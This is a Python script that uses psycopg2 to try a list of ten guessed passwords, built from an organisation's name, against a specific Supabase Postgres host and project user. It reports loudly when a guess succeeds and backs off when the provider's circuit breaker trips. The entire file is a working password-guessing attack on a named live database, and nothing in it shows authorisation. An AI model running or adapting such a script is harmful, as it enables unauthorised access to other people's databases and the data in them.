import psycopg2
import time

host = "aws-0-ap-northeast-1.pooler.supabase.com"
user = "postgres.qtcncebuochelpgwqthx"
dbname = "postgres"
port = 5432

passwords = [
    "BMSIT@123",
    "Bmsit@123",
    "BMSIT123",
    "Bmsit123",
    "bmsit123",
    "Bmsit@1402",
    "BMSIT@2026",
    "Bmsit2026",
    "Medora@bmsit",
    "MedoraBMSIT"
]

for pwd in passwords:
    try:
        conn = psycopg2.connect(
            host=host,
            user=user,
            password=pwd,
            dbname=dbname,
            port=port,
            connect_timeout=3,
            sslmode="require"
        )
        print(f"\n=======================================================", flush=True)
        print(f"!!! SUCCESS! FOUND SUPABASE POSTGRES PASSWORD: {pwd} !!!", flush=True)
        print(f"=======================================================\n", flush=True)
        conn.close()
        exit(0)
    except psycopg2.OperationalError as e:
        msg = str(e).strip().splitlines()[0]
        print(f"Testing {pwd:20} -> {msg}", flush=True)
        if "ECIRCUITBREAKER" in msg:
            print("Circuit breaker active.")
            break
    time.sleep(0.5)
